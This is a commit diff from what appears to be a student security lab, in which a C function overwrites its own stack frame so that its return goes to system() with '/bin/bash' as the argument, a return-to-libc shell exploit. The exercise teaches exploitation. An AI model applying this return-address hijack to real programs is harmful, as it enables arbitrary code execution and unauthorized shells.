01cfc2acd43163ec50f9d3f62f4a4423438616a9
Ryan Marvin <rmarvin1@binghamton.edu>
2020-04-01 15:55:47 -0400

    final commit

--- ret-to-libc.c
+++ ret-to-libc.c
@@ -4,17 +4,17 @@
 extern unsigned long *get_ebp();
 
 void ret2libc(int dummy){
-	/* TASK 1 : Get the value of ebp. Make use of the getebp function you have previously written. */
-	unsigned long *curr_ebp = (unsigned long*) malloc(sizeof(unsigned long)* 4);
-	curr_ebp[0] = *get_ebp();
-	/* TASK2 : Overwrite written address with address of system. */
-	curr_ebp[1] = (unsigned long) &system;
-	curr_ebp[2] = curr_ebp[1];
-
-	/* TASK3 : Set up the argument to system as a pointer to string "/bin/bash" */
+	
 	char* str = "/bin/bash";
-	curr_ebp[3] = *str;
-
+	unsigned long *curr_ebp = get_ebp();
+	unsigned long temp = curr_ebp[1];
+	curr_ebp[1] = (unsigned long) &system;
+	curr_ebp[3] = (unsigned long)str;
+	curr_ebp[2] = temp;
+	
+	/* TASK 1 : Get the value of ebp. Make use of the getebp function you have previously written. */
+	/* TASK2 : Overwrite written address with address of system. */
+	/* TASK3 : Set up the argument to system as a pointer to string "/bin/bash" */
 }
 
 int main(){
